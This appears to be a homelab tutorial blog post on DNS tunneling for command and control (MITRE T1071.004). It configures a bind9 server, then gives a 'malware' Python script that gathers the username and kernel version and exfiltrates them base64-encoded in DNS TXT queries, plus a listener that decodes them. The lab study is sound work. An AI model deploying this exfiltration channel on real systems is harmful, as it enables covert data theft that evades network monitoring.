---
title: DNS Tunneling
date: 2025-06-11
draft: false
author: Alex Jenkins
---
| Category      | ID        | Description       |
| ------------- | --------- | ----------------- |
| Tactic        | TA011     | Command and Control |
| Technique     | T1071     | Application Layer Protocol  |
| Sub-Technique | T1071.004 | Application Layer Protocol: DNS |
# Configuration
## Server
1. Setup Ubuntu server - I'm using 24.04.2

### Domain Name System
Follow this guide: https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html
- Install bind9, dnsutils

**Forward Lookup Zone**
First modify the /etc/bind/named.conf.local file to include your forward lookup zone file and domain. Mind looks like:
```
zone "homelab.local" {
  type master;
  file "/etc/bind/db.homelab.local";
};
```

Now copy an existing zone file as a template like so:
```
sudo cp /etc/bind/db.local /etc/bind/db.homelab.local
```

Then add some A records to the file:
```
;
; BIND data file for local loopback interface
;
$TTL    604800
@       IN      SOA     homelab.local. root.homelab.local. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      homelab.local.
@       IN      A       192.168.1.155      
```
!! Make sure you increment the serial number every time you make a change !!

Restart the server with:
```
sudo systemctl restart bind9
```

```
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

logging {
        channel query.log {
                file "/var/log/named/query.log";
                severity debug 3;
        };
        category queries { query.log; };
};
```

```
sudo mkdir /var/log/named
sudo chown bind:bind /var/log/named
sudo systemctl restart bind9
sudo tail -f /var/log/named/query.log
```

Now test it on another machine with nslookup homelab.local and you should see some acitivity in the log file:
```
root@c2-server:/etc/bind# tail -f /var/log/named/query.log
client @0x77042c1ca578 192.168.1.182#36083 (homelab.local): query: homelab.local IN A + (192.168.1.155)
client @0x77042c1ca578 192.168.1.182#35547 (homelab.local): query: homelab.local IN AAAA + (192.168.1.155)
```

## Infected Machine
On infected machine modify /etc/resolv.conf to include:
```
nameserver 192.168.1.155 # Change this to the IP of your DNS server
```
This simulates real-world DNS connection. In doing this you can keep it isolated to your private network, allowing the infected machine to treat your server as its own DNS - enabling IP resolution. In real-world scenarios this wouldn't be required because the domain would be recognised by a public DNS provider.

# Red Team
``` python
def base64_encode(data):
    # base64 encoding requires input data as bytes
    if not isinstance(data, bytes):
       data = data.encode("utf-8")
    data = base64.b64encode(data)
    return data.decode("utf-8").strip()

def run_command(commands):
    # process commands and return stdout as bytes
    return subprocess.run(commands, capture_output=True).stdout

# Reconnaissance
import subprocess
raw_username = run_command("whoami")
raw_system_info = run_command(["uname", "-r"])

# Encoding
import base64
encoded_username = base64_encode(raw_username)
encoded_system_info = base64_encode(raw_system_info)

# Exfiltration
import dns.resolver
domain = ".homelab.local"
encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
try:
    dns.resolver.resolve(encoded_message, 'TXT')
except Exception as e:
    pass
```

When running the script you should get output like below:
```
client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local): query: YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local IN TXT +E(0) (192.168.1.155)
```

Now that we've confirmed that works it's time to make a python script on the server to strip out the query and decode it.
``` python
import re
import time
import base64

dns_log_file = "/var/log/named/query.log"

with open(dns_log_file, "r") as file:
    file.seek(0,2) # move to end of file
    while True:
        message = []
        line = file.readline()
        if line:
            line = line.strip()
            match = re.search(r'query: ([^\s]+)', line)
            if match:
                query = match.group(1)
                split_query = query.split('.')
                for section in split_query:
                    if section == "homelab" or section == "local":
                        pass
                    else:
                        decoded_section = base64.b64decode(section).decode("utf-8").strip()
                        message.append(decoded_section)
        if message:
            print(" ".join(message))
        time.sleep(1)
```

The program above is designed to listen to the DNS log file for any updates, refreshing every second. I've named it dns_listener.py. You should notice that this is a very basic example and isn't very fault-tolerant. It will quickly strip out the query within the DNS record, split that query into sections by periods, and decode those sections if they don't match one of two keywords; homelab and local. Make sure to adapt those keywords to fit your setup if you're following along or you will have errors.

The malware on the infected machine will gather user and system information relevant to your setup. That said, if all steps were followed correctly, the listener should have successfully decoded the DNS query and will output the infected machine's details.
```
alex@c2-server:~$ python3 dns_listener.py 
alex 6.14.10-arch1-1
```
